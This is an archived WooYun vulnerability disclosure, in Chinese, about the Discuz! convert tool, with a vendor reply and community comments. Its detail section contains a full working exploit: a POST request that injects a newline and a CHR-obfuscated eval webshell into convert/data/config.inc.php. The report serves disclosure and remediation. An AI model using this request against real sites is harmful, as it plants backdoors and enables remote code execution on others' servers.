{"id": 5572, "wybug_id": "wooyun-2013-045611", "wybug_title": "discuz!某自带工具可拿shell", "wybug_corp": "Discuz!", "wybug_author": "kobin97", "wybug_date": "2013-12-11 14:23", "wybug_open_date": "2014-03-08 14:23", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-16：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向公众公开  简要描述： discuz!某自带工具，由于使用不当，可以造成webshell。而且经过调查，使用者数量较大。 详细说明：  discuz! 安装包中会自带一个转换工具 convert这个工具由于存在安全问题，可以拿shell一般存在网站目录 convert 或 utility/convert而且经过调查，使用数量还是很大的。使用前题是data目录可写，这也是这个工具的使用前题。分析：文件：utility\\convert\\include\\do_config.inc.php中保存配置，跟踪到save_config_fileutility\\convert\\include\\global.func.php分析方法：getvars 和 buildarray等可以看出，对key进行过滤只有getvars 前面，但后面的key完全没有过滤。在 GPC OFF 时可直接拿shellON 时，\t\tif($level == 0) {\t\t\t$newline = str_pad('  CONFIG '.strtoupper($key).'  ', 50, '-', STR_PAD_BOTH);\t\t\t$return .= \"\\r\\n// $newline //\\r\\n\";\t\t}首字母也写到文件中。我们只要把key 加上换行符，就能实现写shell通过方法：POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Length: 199Content-Type: application/x-www-form-urlencodednewconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&submit=yes即可以写shell，shell地址convert/data/config.inc.php   漏洞证明：  \n\n\n\n   修复方案：  修改这个程序，或用完删除   版权声明：转载请注明来源 kobin97@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-03-08 14:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-11 14:25 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  牛B  。。。。。。。。 别说是第三方插件！    \n     2013-12-11 14:25 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  强大呀！！！太够力了！    \n     2013-12-11 14:31 |    \t\t笨小猪 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | 杯壁下流)\t\t \n  看来又是某插件造成的？    \n     2013-12-11 14:31 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  这。。。    \n     2013-12-11 14:36 |    \t\tprint_0x0000 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:22        | 一枚苦逼的农民工.)\t\t \n  前排围观~    \n     2013-12-11 14:37 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @爱上平顶山 自带shell 功能哦    \n     2013-12-11 14:42 |    \t\t Jesus \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 天地不仁,以万物为刍狗！)\t\t \n  mark    \n     2013-12-11 15:19 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @kobin97  请问是用黑盒还是白盒的方法发现的呀？    \n     2013-12-11 15:35 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  我觉得一哥马上要有行动了    \n     2013-12-11 15:43 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @小川 我预言你将是预言帝    \n     2013-12-11 16:57 |    \t\tstephenpan \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 还没有！)\t\t \n  第三方插件，现在出问题的太多了，拿Shell，暴库，哎！    \n     2013-12-11 17:04 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  @爱上平顶山 @stephenpan 是那个插件 ？ 人家说是官方自带工具。。牛呀    \n     2013-12-11 17:06 |    \t\tstephenpan \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 还没有！)\t\t \n  @Jannock 我没看清楚，哈哈，我是最近被插件搞过！    \n     2013-12-11 17:09 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @Jannock 鹅鹅鹅饿鹅鹅鹅饿    大婶  好久不见    \n     2013-12-11 18:46 |    \t\t江南的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:15        | 天生庸才！)\t\t \n  估计是这个 WooYun: Discuz!7.X后台任意代码执行    \n     2013-12-11 21:16 |    \t\t江南的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:15        | 天生庸才！)\t\t \n  在工具下面这个计划任务很可疑，呵呵，我也是猜测的    \n     2013-12-11 22:33 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  坐等公开    \n     2013-12-13 13:33 |    \t\t网络流氓 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 欢迎热爱网络安全的朋友技术交流QQ:1020471...)\t\t \n  这是要逆天的节奏哇    \n     2013-12-13 15:39 |    \t\tfyth \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我就看看，不说话)\t\t \n  马克，坐等公开    \n     2013-12-14 11:06 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  需要数据库密码吧    \n     2013-12-17 12:09 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  忽略了 ==Discuz这个厂商实在是...    \n     2013-12-19 21:23 |    \t\t职业色羊 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 无)\t\t \n  Mark    \n     2014-02-07 12:41 |    \t\t︶ㄣ时空丶之翼 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 白帽子一枚- -)\t\t \n  Mark!    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}